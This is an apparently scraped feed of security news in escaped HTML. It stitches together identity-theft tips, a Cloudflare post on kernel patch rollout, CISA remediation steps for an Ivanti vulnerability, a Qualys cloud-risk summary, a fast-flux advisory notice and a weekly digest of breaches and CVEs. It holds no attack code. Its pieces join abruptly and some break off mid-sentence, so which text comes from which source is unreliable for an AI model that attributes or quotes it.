&lt;li&gt;&lt;strong&gt;Credit card fraud alerts: &lt;/strong&gt;For extra security, set up fraud alerts by contacting your credit card company or any of the three major credit bureaus &amp;#8211; &lt;a href="https://www.equifax.com/personal/credit-report-services/credit-fraud-alerts/" rel="noreferrer noopener" target="_blank"&gt;Equifax&lt;/a&gt;, &lt;a href="https://www.experian.com/help/fraud-alert/" rel="noreferrer noopener" target="_blank"&gt;Experian&lt;/a&gt;, or &lt;a href="https://www.transunion.com/fraud-alerts?atvy=%7B%22264995%22%3A%22Experience+B%22%7D" rel="noreferrer noopener" target="_blank"&gt;TransUnion&lt;/a&gt;. Fraud alerts require&amp;nbsp;creditors to take extra steps to verify your identity before opening&amp;nbsp;accounts and lines of credit&amp;nbsp;in your name.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Bank account alerts&lt;/strong&gt;: Set up &lt;a href="https://www.1stunitedcu.org/more-for-you/financial-wellness/five-account-alerts-you-should-set-up-today" rel="noreferrer noopener" target="_blank"&gt;bank account alerts&lt;/a&gt; to help monitor for any unusual banking activity. You can choose to get alerts via phone, email or text.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Credit card freeze&lt;/strong&gt;: Consider putting a &lt;a href="https://www.experian.com/blogs/ask-experian/how-to-freeze-a-credit-card/#:~:text=Typically%2C%20you%20can%20freeze%20your,lock%20by%20your%20card%20issuer." rel="noreferrer noopener" target="_blank"&gt;credit card freeze&lt;/a&gt; on any credit cards you’re not using. This puts a temporary hold on your card and prevents all purchases until you decide to unfreeze it.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Check bank statements: &lt;/strong&gt;Review your &lt;a href="https://www.usnews.com/banking/articles/guide-to-bank-statements" rel="noreferrer noopener" target="_blank"&gt;bank statements&lt;/a&gt; monthly. Checking on your statements can help you spot suspicious activity and catch fraudulent transactions quickly.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Keeping&amp;nbsp; your digital identity safe is not just a one-day event, it’s an ongoing commitment to protect your personal information. Identity Management Day serves as a valuable reminder to be proactive. From using MFA and strong passwords to setting up alerts on your credit cards and bank account, you can help safeguard your sensitive information. Don’t wait until you become a victim of identity theft &amp;#8211; start strengthening your identity security today.&lt;/p&gt;

This blog post outlines how we deliver newly patched kernels across our</description><content:encoded>&lt;p&gt;As cyber threats continue to exploit systemic vulnerabilities in widely used technologies, the &lt;a href="https://www.cisa.gov/"&gt;&lt;u&gt;United States Cybersecurity and Infrastructure Agency (CISA)&lt;/u&gt;&lt;/a&gt; produced best practices for the technology industry with their &lt;a href="https://www.cisa.gov/securebydesign/pledge"&gt;&lt;u&gt;Secure-by-Design pledge&lt;/u&gt;&lt;/a&gt;. Cloudflare proudly signed this pledge on May 8, 2024, reinforcing our commitment to creating resilient systems where security is not just a feature, but a foundational principle.&lt;/p&gt;&lt;p&gt;We’re excited to share and provide transparency into how our security patching process meets one of CISA’s goals in the pledge: &lt;i&gt;Demonstrating actions taken to increase installation of security patches for our customers.&lt;/i&gt;&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Balancing security patching and customer experience &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#balancing-security-patching-and-customer-experience"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Managing and deploying Linux kernel updates is one of Cloudflare’s most challenging security processes. In 2024, over &lt;a href="https://www.cvedetails.com/vulnerability-list/vendor_id-33/product_id-47/year-2024/Linux-Linux-Kernel.html"&gt;&lt;u&gt;1000 CVEs were logged against the Linux kernel and patched&lt;/u&gt;&lt;/a&gt;. To keep our systems secure, it is vital to perform critical patch deployment across systems while maintaining the user experience. &lt;/p&gt;&lt;p&gt;A common technical support phrase is “Have you tried turning it off and then on again?”.  One may be  surprised how often this tactic is used — it is also an essential part of how Cloudflare operates at scale when it comes to applying our most critical patches. Frequently restarting systems exercises the restart process, applies the latest firmware changes, and refreshes the filesystem. Simply put, the Linux kernel requires a restart to take effect.&lt;/p&gt;&lt;p&gt;However, considering that a single Cloudflare server may be processing hundreds of thousands of requests at any point in time, rebooting it would impact user experience. As a result, a calculated approach is required, and traffic must be carefully removed from the server before it can safely reboot. &lt;/p&gt;&lt;p&gt;First, the server is marked for maintenance. This action alerts our load balancing system, &lt;a href="https://blog.cloudflare.com/unimog-cloudflares-edge-load-balancer/"&gt;&lt;u&gt;unimog&lt;/u&gt;&lt;/a&gt;, to stop sending traffic to this server. Next, the server waits for this flow of traffic to terminate, and once public traffic is gone, the server begins to disable internal traffic. Internal traffic has multiple purposes, such as determining optimal routing, service discovery, and system health checks. Once the server is no longer actively serving any traffic, it can safely restart, using the new kernel.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Kernel lifecycle at Cloudflare&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#kernel-lifecycle-at-cloudflare"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;This diagram is a high level view of the lifecycle of the Linux kernel at Cloudflare. The list of kernel versions shown is a point in time example snapshot from &lt;a href="https://kernel.org"&gt;&lt;u&gt;kernel.org&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/3CTWS8T4bPfoSFVrGyKPQA/6feade777d7358bce76f12f0aebce7dd/BLOG-2754_2.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;First, a new kernel is released by the upstream kernel developers. We follow the &lt;a href="https://cdn.kernel.org/"&gt;&lt;u&gt;longterm stable branch of the kernel&lt;/u&gt;&lt;/a&gt;. Each new kernel release is pulled into our internal repository automatically, where the kernel is built and tested. Once all testing has successfully passed, several flavors of the kernel are built and readied for a preliminary deployment.&lt;/p&gt;&lt;p&gt;The first stage of deployment is an internal environment that receives no traffic. Once it is confirmed that there are no crashes or unintended behavior, it is promoted to a production environment with traffic generated by Cloudflare employees as eyeballs.&lt;/p&gt;&lt;p&gt;Cloudflare employees are connected via Zero Trust to this environment. This allows our telemetry to collect information regarding CPU utilization, memory usage, and filesystem behavior, which is then analyzed for deviations from the previous kernel. This is the first time that a new kernel is interacting with live traffic and real users in a Cloudflare environment. &lt;/p&gt;&lt;p&gt;Once we are satisfied with kernel performance and behavior, we begin to deploy this kernel to customer traffic. This progression starts as a small percentage of traffic in multiple datacenters and ends in one large regional datacenter. This is an important qualification phase for a new kernel, as we need to collect data on real world traffic. Once we are satisfied with performance and behavior, we have a candidate release that can go everywhere.&lt;/p&gt;&lt;p&gt;When a new kernel is ready for release, an &lt;a href="https://blog.cloudflare.com/how-the-cloudflare-global-network-optimizes-for-system-reboots-during-low-traffic-periods/"&gt;&lt;u&gt;automated cycle named the Edge Reboot Release&lt;/u&gt;&lt;/a&gt; is initiated. The Edge Reboot Release begins and completes every 30 days. This guarantees that we are running an up-to-date kernel in our infrastructure every month.&lt;/p&gt;&lt;p&gt;What about patches for the kernel that are needed faster than the standard cycle? We can live patch changes &lt;a href="https://blog.cloudflare.com/live-patch-security-vulnerabilities-with-ebpf-lsm/"&gt;&lt;u&gt;to close those gaps faster&lt;/u&gt;&lt;/a&gt;, and we have even &lt;a href="https://blog.cloudflare.com/cve-2022-47929-traffic-control-noqueue-no-problem/"&gt;&lt;u&gt;written about closing one of these CVE’s&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Automating kernel updates in our Control Plane &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#automating-kernel-updates-in-our-control-plane"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;The Cloudflare network is 50 ms from 95% of the world’s Internet-connected population. The Control Plane runs different workloads than our network, and is composed of 80 different clustered workloads responsible for persistence of information and decisions that feed the Cloudflare network. Until 2024, the Control Plane kernel maintenance was performed ad-hoc, and this caused the working kernel for Control Plane workloads to fall behind on patches. Under the pledge, this had to change and become just as consistent as the rest of our network.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/WtlwbERX7MysNbZ3ZwVya/31813f69bedc166406d1fca241eba184/BLOG-2754_3.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;Consider a relational database as an example workload, as illustrated in the diagram above. One would need a copy available to restart the original in order to provide a seamless end user experience. This copy is called a database replica. That replica should then be promoted to become the primary serving database. Now that a new primary is serving traffic, the old primary is free to restart. If a database replica reboot is needed, an additional replica would be needed to take its place, allowing another safe restart. In this example, we have 2 different ways to restart a member of the clustered workload. Every clustered workload has different safe methodologies to restart one of its members.&lt;/p&gt;&lt;p&gt;Reboau (short for reboot automation) is an internally-built tool to manage custom reboot logic in the Control Plane. Reboau offers additional efficiencies described as “rack aware”, meaning it can operate on a rack of servers vs. a single server at a time. This optimization is helpful for a clustered workload, where it may be more efficient to drain and reboot a rack versus a single server. It also leverages metrics to determine when it is safe to lose a clustered member, execute the reboot, and ensure the system is healthy through the process.&lt;/p&gt;&lt;p&gt;In 2024, Cloudflare migrated Control Plane workloads to leverage Reboau and follow the same kernel upgrade cadence as the network. Now all of our infrastructure benefits from faster patching of the Linux kernel, to improve security and reliability for our customers.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Conclusion &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#conclusion"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Irrespective of the industry, if your organization builds software, we encourage you to familiarize yourself with &lt;a href="https://www.cisa.gov/securebydesign"&gt;&lt;u&gt;CISA’s ‘Secure by Design’ principles&lt;/u&gt;&lt;/a&gt; and create a plan to implement them in your company. The CISA Secure by Design pledge is built around seven security goals, prioritizing the security of customers, and challenges organizations to think differently about security. &lt;/p&gt;&lt;p&gt;By implementing automated security patching through kernel updates, Cloudflare has demonstrated measurable progress in implementing functionality that allows automatic deployment of software patches by default.

&lt;/ul&gt;
&lt;p&gt;For any instances of Ivanti Connect Secure that were not updated by Feb. 28, 2025, to the latest Ivanti patch (22.7R2.6) and &lt;strong&gt;all&lt;/strong&gt; instances of Pulse Connect Secure (EoS), Policy Secure, and ZTA Gateways, CISA urges users and administrators to implement the following actions:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Conduct threat hunting actions:
&lt;ol&gt;
&lt;li&gt;Run an external Integrity Checker Tool (ICT). For more guidance, see Ivanti’s &lt;a href="https://www.ivanti.com/blog/enhanced-external-integrity-checking-tool-to-provide-additional-visibility-and-protection-for-customers-against-evolving-threat-actor-techniques-in-relation-to-previously-disclosed-vulnerabilities" title="Enhanced External Integrity Checking Tool to Provide Additional Visibility and Protection for Customers Against Evolving Threat Actor Techniques in Relation to Previously Disclosed Vulnerabilities"&gt;instructions&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Conduct threat hunt actions on any systems connected to—or recently connected to—the affected Ivanti device.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;If threat hunting actions determine no compromise:
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;For the highest level of confidence, conduct a factory reset.&lt;/strong&gt;
&lt;ol&gt;
&lt;li&gt;For Cloud and Virtual systems, conduct a factory reset using an external known clean image of the device.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Apply the patch described in Security Advisory Ivanti Connect Secure, Policy Secure &amp;amp; ZTA Gateways (CVE-2025-22457). Please note that patches for Ivanti ZTA Gateways and Ivanti Policy Secure will be available April 19 and 21, respectively. Consider disconnecting vulnerable devices until patches are available.&lt;/li&gt;
&lt;li&gt;Monitor the authentication or identity management services that could be exposed.&lt;/li&gt;
&lt;li&gt;Continue to audit privilege level access accounts.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;If threat hunting actions determine compromise:
&lt;ol&gt;
&lt;li&gt;For devices that are confirmed compromised, isolate all affected instances from the network. Keep impacted devices isolated until the below guidance is completed and patches are applied.&lt;/li&gt;
&lt;li&gt;Take a forensic image (including memory capture) or work with Ivanti to get a copy of the image.&lt;/li&gt;
&lt;li&gt;Disconnect all compromised instances. &amp;nbsp;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;For the highest level of confidence, conduct a factory reset.&lt;/strong&gt;
&lt;ol&gt;
&lt;li&gt;For Cloud and Virtual systems, conduct a factory reset using an external known clean image of the device.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Revoke and reissue any connected or exposed certificates, keys, and passwords, to include the following:
&lt;ol&gt;
&lt;li&gt;Reset the admin enable password.&lt;/li&gt;
&lt;li&gt;Reset stored application programming interface (API) keys.&lt;/li&gt;
&lt;li&gt;Reset the password of any local user defined on the gateway, including service accounts used for auth server configuration(s).&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;If domain accounts associated with the affected products have been compromised:
&lt;ol&gt;
&lt;li&gt;Reset passwords twice for on premise accounts, revoke Kerberos tickets, and then revoke tokens for cloud accounts in hybrid deployments.&lt;/li&gt;
&lt;li&gt;For cloud joined/registered devices, disable devices in the cloud to revoke the device tokens.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Apply the patch described in Security Advisory Ivanti Connect Secure, Policy Secure &amp;amp; ZTA Gateways (CVE-2025-22457). Please note that patches for Ivanti ZTA Gateways and Ivanti Policy Secure will be available April 19 and 21, respectively.&lt;/li&gt;
&lt;li&gt;Report to CISA and Ivanti immediately.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;

Even more alarming, 36% of those affected faced multiple breaches within a single year.&lt;/p&gt;



&lt;p&gt;This is just one of many cloud security pain points that over 100 security and IT practitioners shared in a &lt;a href="https://www.qualys.com/forms/whitepapers/dark-reading-state-cloud-saas-security-report/"&gt;recent study by Dark Reading and Qualys&lt;/a&gt;. The picture that emerged is clear: the rapid pace of cloud-native adoption—from AI services to containerized apps—is outstripping many organizations’ ability to manage security risk.&lt;/p&gt;



&lt;span id="more-37494"&gt;&lt;/span&gt;



&lt;hr class="wp-block-separator has-alpha-channel-opacity" /&gt;



&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Download the full Dark Reading report today to see everything the research revealed.&lt;/strong&gt;&lt;/p&gt;



&lt;div class="wp-block-button is-style-fill" style="margin: 0 auto 1em; text-align: center;"&gt;&lt;a class="wp-block-button__link has-white-color has-text-color has-background" href="https://www.qualys.com/forms/whitepapers/dark-reading-state-cloud-saas-security-report/" style="background-color: #ed2e26;"&gt;Download Now&lt;/a&gt;&lt;/div&gt;



&lt;hr class="wp-block-separator has-alpha-channel-opacity" /&gt;



&lt;p&gt;When the &lt;a href="https://www.qualys.com/tru/"&gt;Qualys Threat Research Unit (TRU)&lt;/a&gt; correlated these practitioner insights with our own telemetry, the findings highlighted a pattern of recurring challenges: misconfigurations leading to exfiltration risk, vulnerable assets exposed to the public internet, persistent ransomware threats, and compliance drift.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-37517" height="1750" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/04/Graphs-Template-BLOG-250328.png" width="3750" /&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Let’s dive into three key insights from the research:&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="insight-1-self-inflicted-cloud-wounds"&gt;&lt;strong&gt;Insight 1: Self-Inflicted Cloud Wounds&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;Despite rising sophistication in attacker tactics, the number one risk remains surprisingly basic — human error at 30%. Misconfigured cloud services continue to open doors for data breaches, and the rise of infrastructure as code (IaC) and AI-generated configurations is amplifying this risk.&lt;/p&gt;



&lt;p&gt;One stark example: &lt;a href="https://blog.qualys.com/vulnerabilities-threat-research/2023/12/18/hidden-risks-of-amazon-s3-misconfigurations"&gt;a misconfigured AWS S3 bucket led to the exposure of 4,600 passport scans.&lt;/a&gt; These kinds of mistakes—whether manual or automated—are precisely why continuous misconfiguration scanning, supported by policy-based enforcement (e.g., CIS Benchmarks), remains a must-have. In fact, as seen in the data above, 99% of Virtual Machines are non-compliant for MFA delete on Critical AWS S3 Buckets in the cloud!&lt;/p&gt;



&lt;p&gt;Moreover, these security lapses are often exploited through social engineering. Deceptive phishing emails or malicious links prey on the human element, leading to compromised credentials or unauthorized access. The bottom line: reducing the cloud attack surface starts with proactively managing misconfigurations and educating users on phishing risks.&lt;/p&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-37514" height="499" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/04/DarkReading_BlogChart_1-1-1070x499.png" width="1070" /&gt;&lt;/figure&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-34582" height="588" src="https://ik.imagekit.io/qualys/wp-content/uploads/2023/12/AWS-Control-Pass59-1070x588.png" width="1070" /&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading" id="insight-2-skill-gaps-in-incident-response"&gt;&lt;strong&gt;Insight 2: Skill Gaps in Incident Response&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;Even with security tooling in place, organizations are struggling to respond effectively to breaches. It’s not the tech—it’s the talent. Cloud-native environments bring new variables—containers, AI workloads, multi-cloud networks—that overwhelm traditional incident response (IR) playbooks.&lt;/p&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-37515" height="499" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/04/DarkReading_BlogChart_2-1-1070x499.png" width="1070" /&gt;&lt;/figure&gt;



&lt;p&gt;As attackers automate initial access and lateral movement through exposed APIs and credentials, security teams need deeper visibility and smarter automation. For example, in a &lt;a href="https://blog.qualys.com/vulnerabilities-threat-research/2024/12/19/securing-cloud-environments-against-potential-extortion-threats"&gt;recent Qualys TRU analysis of a cloud extortion attack&lt;/a&gt;, exposed API keys were used to exfiltrate sensitive data — all without tripping standard detection.&lt;/p&gt;



&lt;p&gt;As seen in the data in the beginning of this blog, more than 3.9M+ VMs led to potential lateral movements. Security teams must start thinking like attackers. Mapping potential exploit paths from misconfiguration to compromise and integrating response playbooks directly into risk insights, is essential. The report explores how security operations can incorporate this mindset through automation and guided remediation.&lt;/p&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-37501" height="205" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/04/Screenshot-2025-04-02-at-9.16.47 AM-1070x205.png" width="1070" /&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading" id="insight-3-the-increasing-cloud-conundrum-of-webapps-and-containers"&gt;&lt;strong&gt;Insight 3: The Increasing Cloud Conundrum of WebApps and Containers&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;Containerized workloads and modern web applications are becoming foundational — but they’re also bringing complex, ephemeral risks. Containers introduce more inter-process communication, expanded network exposure, and rapid lifecycle changes that make traditional controls obsolete.&lt;/p&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-37516" height="499" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/04/DarkReading_BlogChart_3-1-1070x499.png" width="1070" /&gt;&lt;/figure&gt;



&lt;p&gt;For example, &lt;a href="https://www.cloudvulnerabilityscanner.com/posts/exposed-docker-daemon-ports-risks-prevention"&gt;Qualys TRU recently uncovered Docker daemon ports&lt;/a&gt; exposed in production environments, a misstep often stemming from dev/test habits making their way into production. These ports were exploited in crypto-mining attacks, underlining how misconfigurations can quickly become monetizable vulnerabilities.&lt;/p&gt;



&lt;p&gt;Add to that the widespread use of third-party dependencies, and the result is an attack surface that’s constantly shifting and often invisible to traditional scanners. The report dives into practical strategies to lock down container environments and enforce policies before workloads go live.&lt;/p&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-37500" height="672" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/04/fig1-1070x672.jpg" width="1070" /&gt;&lt;/figure&gt;






&lt;h2 class="wp-block-heading" id="conclusion-cloud-risk-is-rising-but-so-is-the-opportunity-to-get-ahead"&gt;&lt;strong&gt;Conclusion: Cloud Risk is Rising—But So Is the Opportunity to Get Ahead&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;Modern cloud environments are growing more complex, dynamic, and—when mismanaged—dangerous. From misconfigurations in infrastructure as code to skill gaps in incident response and container security blind spots, the risks are clear.&lt;/p&gt;



&lt;p&gt;But here’s the thing: these are just &lt;strong&gt;three of the key insights&lt;/strong&gt; uncovered in the new Dark Reading research, developed in collaboration with Qualys. When combined with threat intelligence from the Qualys Threat Research Unit (TRU), the report offers a deeper look at how security teams can better understand—and act on—their cloud and SaaS risk exposure.&lt;/p&gt;

&lt;p&gt;CISA encourages users and administrators to review newly released ICS advisories for technical details and mitigations.&lt;/p&gt;</description><guid isPermaLink="false">/node/23214</guid></item><item><title>NSA, CISA, FBI, and International Partners Release Cybersecurity Advisory on “Fast Flux,” a National Security Threat</title><link>https://www.cisa.gov/news-events/alerts/2025/04/03/nsa-cisa-fbi-and-international-partners-release-cybersecurity-advisory-fast-flux-national-security</link><description>&lt;p&gt;Today, CISA—in partnership with the National Security Agency (NSA), Federal Bureau of Investigation (FBI), Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC), Canadian Centre for Cyber Security (CCCS), and New Zealand’s National Cyber Security Centre (NCSC-NZ)—released joint Cybersecurity Advisory &lt;a href="https://media.defense.gov/2025/Apr/02/2003681172/-1/-1/0/CSA-FAST-FLUX.PDF"&gt;Fast Flux: A National Security Threat&lt;/a&gt; (PDF, 841 KB). This advisory warns organizations, internet service providers (ISPs), and cybersecurity service providers of the ongoing threat of fast flux enabled malicious activities and provides guidance on detection and mitigations to safeguard critical infrastructure and national security.&lt;/p&gt;
&lt;p&gt;“Fast flux” is a technique used to obfuscate the locations of malicious servers through rapidly changing Domain Name System (DNS) records associated with a single domain name. This threat exploits a gap commonly found in network defenses, making the tracking and blocking of malicious fast flux activities difficult.&lt;/p&gt;
&lt;p&gt;The authoring agencies strongly recommend adopting a multi-layered approach to detection and mitigation to reduce risk of compromise by fast flux-enabled threats. Service providers, especially Protective DNS providers (PDNS), should track, share information about, and block fast flux as part of their provided cybersecurity services. Government and critical infrastructure organizations should close this ongoing gap in network defenses by using cybersecurity and PDNS services that block malicious fast flux activity.&lt;/p&gt;
&lt;p&gt;For more information on PDNS services, see &lt;a href="https://media.defense.gov/2025/Mar/24/2003675043/-1/-1/0/CSI-SELECTING-A-PROTECTIVE-DNS-SERVICE-V1.3.PDF" title="Selecting a Protective DNS Service"&gt;Selecting a Protective DNS Service&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">/node/23207</guid></item><item><title>Our key achievements from 2024</title><link>http://privacyinternational.org/long-read/5551/our-key-achievements-2024</link><guid isPermaLink="false">5551 at http://privacyinternational.org</guid></item><item><title>Cybersecurity Professor Faced China-Funding Inquiry Before Disappearing, Sources Say</title><link>https://www.wired.com/story/xiaofeng-wang-indiana-university-research-probe-china/</link><description>A lawyer for Xiaofeng Wang and his wife says they are “safe” after FBI searches of their homes and Wang’s sudden dismissal from Indiana University, where he taught for over 20 years.</description><guid isPermaLink="false">67ec08020ba8e7cf76d9d15e</guid><category>Security</category><category>Security / Security News</category><category>cybersecurity</category><category>privacy</category><category>encryption</category><category>China</category><category>academia</category><category>Crime</category><category>national security</category><category>Deciphering</category></item><item><title>KeePass Review (2025): Features, Pricing, and Security</title><link>https://www.techrepublic.com/article/keepass-review/</link><description>While its downloadable plugins make it highly customizable, KeePass’ unintuitive interface holds it back from one of our top password manager picks.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4210498</guid><category>Cloud Security</category><category>Security</category><category>Technology</category><category>KeePass</category><category>password manager</category></item><item><title>Happy 21st Birthday, Gmail!

&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TOP ATTACKS AND BREACHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;New York University (NYU) &lt;a href="https://nyunews.com/news/2025/03/22/nyu-website-hacked-data-leak/"&gt;suffered&lt;/a&gt; a cyber-attack which resulted in the exposure of over 3 million applicants&amp;#8217; data, including names, test scores, majors, and zip codes. The hacker redirected NYU&amp;#8217;s website to display this information, alleging the university&amp;#8217;s continued use of race-sensitive admissions policies despite the Supreme Court&amp;#8217;s 2023 ruling against affirmative action. The breach also included downloadable files containing admissions data dating back to 1989.&lt;/li&gt;
&lt;li&gt;Kuala Lumpur International Airport (KLIA) &lt;a href="https://cybersecuritynews.com/kuala-lumpur-airport-suffered-cyberattack/"&gt;fell&lt;/a&gt; victim to a cyber-attack which resulted in the disruption of its immigration system, causing significant delays for both inbound and outbound travelers. The incident reportedly affected check-in counters and caused long queues across the airport. Authorities confirmed the hackers demanded a $10 million ransom payment.&lt;/li&gt;
&lt;li&gt;Ukrzaliznytsia, Ukraine&amp;#8217;s state-owned railway operator, has been the &lt;a href="https://therecord.media/ukraine-railway-ukrzaliznytsia-cyberattack-online-ticket-system"&gt;target&lt;/a&gt; of a major cyberattack, resulting in disruptions to its online services, including its mobile app used for ticket purchases. While the attack did not affect train schedules, it did cause significant inconvenience to passengers who had to purchase tickets physically at stations.&lt;/li&gt;
&lt;li&gt;Sam&amp;#8217;s Club, a U.S.-based warehouse supermarket chain owned by Walmart, is &lt;a href="https://www.bleepingcomputer.com/news/security/retail-giant-sams-club-investigates-clop-ransomware-breach-claims/"&gt;investigating&lt;/a&gt; claims of a potential cyber security incident. The Clop ransomware gang has listed Sam&amp;#8217;s Club on its dark web leak site, alleging that the company has ignored security concerns. The threat actors have not yet published any proof of the breach, and Sam&amp;#8217;s Club has not disclosed any specific details regarding the incident.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check Point Threat Emulation and Harmony Endpoint provide protection against this threat&lt;/em&gt; &lt;em&gt;(Ransomware.Win.Clop; Ransomware.Wins.Clop; Ransomware.Wins.Clop.ta.*)&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Pennsylvania&amp;#8217;s Union County &lt;a href="https://unioncountypa.org/wp-content/uploads/2025/03/Union-County-Website-Notice.pdf"&gt;disclosed&lt;/a&gt; that it had suffered a ransomware attack. According to the county’s statement, the information exfiltrated in the attack includes Social Security Numbers as well as driver&amp;#8217;s licenses. No ransomware group has taken responsibility for the attack yet.&lt;/li&gt;
&lt;li&gt;US mobility solutions firm Numotion had &lt;a href="https://www.bitdefender.com/en-us/blog/hotforsecurity/mobility-solution-company-numotion-data-breach-exposes-data-of-half-a-million-people"&gt;experienced&lt;/a&gt; a cyber-attack which resulted in a data breach impacting nearly 500,000 individuals. An unauthorized third party gained access to the email accounts of some of its employees between September 2, 2024, and November 18, 2024, following successful phishing emails.&lt;/li&gt;
&lt;li&gt;Abracadabra Finance had &lt;a href="https://therecord.media/nearly-thirteen-million-stolen-abracadabra"&gt;suffered&lt;/a&gt; a cyber-attack which resulted in the theft of approximately $13 million worth of digital currency. The breach was traced to vulnerabilities in their &amp;#8220;cauldrons,&amp;#8221; isolated lending markets allowing users to borrow against various cryptocurrencies. The company is collaborating with security firms to investigate the incident and has offered a 20% bug bounty to the attacker for the return of the stolen funds.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Researchers have &lt;a href="https://securelist.com/operation-forumtroll/115989/"&gt;disclosed&lt;/a&gt; that Google Chrome zero-day exploit chain was used by APT group dubbed ForumTroll. The first vulnerability (CVE-2025-2783) allowed the attackers to bypass Google Chrome’s sandbox protection, while it was design to run with additional exploit that enables remote code execution. Google released a fix to CVE-2025-2783.&lt;/li&gt;
&lt;li&gt;A critical vulnerability (CVE-2025-23120) in Veeam Backup &amp;amp; Replication software, that allows remote code execution by authenticated domain users, was recently &lt;a href="https://labs.watchtowr.com/by-executive-order-we-are-banning-blacklists-domain-level-rce-in-veeam-backup-replication-cve-2025-23120/"&gt;patched&lt;/a&gt;. The flaw stems from inconsistent deserialization handling that permits exploitation via unblocked classes such as Veeam.Backup.EsxManager.xmlFrameworkDs and Veeam.Backup.Core.BackupSummary.&lt;/li&gt;
&lt;li&gt;Researchers have &lt;a href="https://blog.securelayer7.net/cve-2025-25364-speedify-vpn-macos-escalation/"&gt;elaborated&lt;/a&gt; on a critical command injection vulnerability (CVE-2025-25364) in Speedify VPN on macOS. The lack of proper input validation of user-controlled fields (cmdPath and cmdBin) within XPC messages allows a local attacker to inject arbitrary commands. Successful exploitation could potentially lead to privilege escalation and full system compromise. The vulnerability has been patched in Speedify VPN version 15.4.1.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;THREAT INTELLIGENCE REPORTS&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Researchers &lt;a href="https://www.welivesecurity.com/en/eset-research/you-will-always-remember-this-as-the-day-you-finally-caught-famoussparrow/"&gt;reported&lt;/a&gt; on a cyber espionage operation by Weaver Ant, a China-nexus threat actor targeting a major telecommunications provider in Asia. The group exploited home routers and deployed a novel web shell to infiltrate the network, aiming for continuous access and sensitive data collection. Weaver Ant&amp;#8217;s tactics include leveraging web shells and tunneling techniques to maintain persistence within the compromised environment.&lt;/li&gt;
